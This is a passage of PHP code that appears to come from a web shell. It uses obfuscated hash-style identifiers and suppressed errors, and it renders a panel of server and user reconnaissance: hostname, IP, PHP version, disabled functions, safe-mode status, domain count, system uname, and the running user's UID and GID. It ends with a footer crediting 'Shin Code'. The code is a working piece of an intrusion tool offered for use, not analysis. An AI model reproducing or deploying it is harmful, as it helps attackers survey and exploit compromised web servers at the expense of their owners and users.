                    $var_68e061dd491567ba3ef6bb56ef16e9da = @gethostbynamel($var_f828b6b93dc6670a3d566d0f50422ab5);

                    if ($var_68e061dd491567ba3ef6bb56ef16e9da !== false) {
                        return count($var_68e061dd491567ba3ef6bb56ef16e9da);
                    } else {
                        return 0;
                    }
                }

                $var_5481d56cc84fdf414bab721d5bf46814 = @fn_0446e6377c6a21d4f0e7667c1f3de760();
                function fn_d9300787870b413616f734635a85029e($var_44f6d7c4cf3df3cd522d089100a30646, $var_a5931ca6e5f805650df58ca2a0c77f14 = 2) {
                    $var_61be284663626616b84376702e6621d7 = array('B', 'KB', 'MB', 'GB', 'TB');

                    $var_44f6d7c4cf3df3cd522d089100a30646 = max($var_44f6d7c4cf3df3cd522d089100a30646, 0);
                    $var_4799e2ad17c51bf6604fa203973523f5 = floor(($var_44f6d7c4cf3df3cd522d089100a30646 ? log($var_44f6d7c4cf3df3cd522d089100a30646) : 0) / log(1024));
                    $var_4799e2ad17c51bf6604fa203973523f5 = min($var_4799e2ad17c51bf6604fa203973523f5, count($var_61be284663626616b84376702e6621d7) - 1);

                    $var_44f6d7c4cf3df3cd522d089100a30646 /= (1 << (10 * $var_4799e2ad17c51bf6604fa203973523f5));

                    return round($var_44f6d7c4cf3df3cd522d089100a30646, $var_a5931ca6e5f805650df58ca2a0c77f14) . ' ' . $var_61be284663626616b84376702e6621d7[$var_4799e2ad17c51bf6604fa203973523f5];
                }
                ?>
                <ul class="info-list">
                    <li>Hostname: <?php echo @gethostname(); ?></li>
                    <?php if (isset($_SERVER['SERVER_ADDR'])): ?>
                        <li>IP Address: <?php echo $_SERVER['SERVER_ADDR']; ?></li>
                    <?php endif; ?>
                    <li>PHP Version: <?php echo @phpversion(); ?></li>
                    <li>Server Software: <?php echo $_SERVER['SERVER_SOFTWARE']; ?></li>
                    <?php if (function_exists('disk_total_space')): ?>
                        <li>HDD Total Space: <?php echo @fn_d9300787870b413616f734635a85029e(disk_total_space('/')); ?></li>
                        <li>HDD Free Space: <?php echo @fn_d9300787870b413616f734635a85029e(disk_free_space('/')); ?></li>
                    <?php endif; ?>
                    <li>Safe Mode: <?php echo @ini_get('safe_mode') ? 'Enabled' : 'Disabled'; ?></li>
                    <li>Disable Functions: <?php echo @ini_get('disable_functions'); ?></li>
                    <li>Total Domains in Server: <?php echo $var_5481d56cc84fdf414bab721d5bf46814; ?></li>
                    <li>System: <?php echo @php_uname(); ?></li>
                </ul>
            </div>
            <div class="info-container">
                <h2>User Info</h2>
                <ul class="info-list">
                    <li>Username: <?php echo @get_current_user(); ?></li>
                    <li>User ID: <?php echo @getmyuid(); ?></li>
                    <li>Group ID: <?php echo @getmygid(); ?></li>
                </ul>
            </div>
        </div>
    </div>
    <script>
        function toggleOptionsMenu() {
            var optionsMenu = document.getElementById('optionsMenu');
            optionsMenu.classList.toggle('show');
        }

        function toggleSidebar() {
            var sidebar = document.getElementById('sidebar');
            sidebar.classList.toggle('open');
        }
    </script>
</div>
<div class='footer'><p>&copy; <?php echo date('Y'); ?> <a href="https://www.blog-gan.org">Shin Code</a>. All rights reserved.</p>
 </div>
</body>
</html>